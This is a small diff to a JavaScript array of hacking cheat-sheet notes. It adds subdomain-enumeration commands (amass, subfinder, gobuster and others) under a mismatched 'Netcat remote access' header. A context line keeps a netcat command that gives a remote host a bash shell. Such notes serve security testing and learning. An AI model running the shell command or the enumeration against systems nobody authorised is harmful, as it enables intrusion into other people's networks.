@@ -85,6 +85,11 @@ const mynotes = [
         "notes": "<h4>netcat</h4><code>nc  host  port  -e  /bin/bash</code><br><br>",
         "description": "netcat, remote, access, /bin/bash , shell"
     },
+    {
+        "header": "Netcat remote access",
+        "notes": "<h4>Subdomain Enum</h4><code>amass enum -d example.com</code><br><br><code>amass enum -d example.com -o output.txt -rf resolvers.txt -brute</code><br><br><code>subfinder -d example.com</code><br><br><code>gobuster dns -d example.com -w /path/to/wordlist.txt -t 50</code><br><br><code>censys subdomain example.com</code><br><br><code>assetfinder --subs-only example.com</code><br><br><code>findomain -t example.com</code><br><br><code>knockpy example.com</code><br><br>",
+        "description": "subdomain, enum, takeover, information, gathering"
+    },
     // Add more data here...
   ];
   
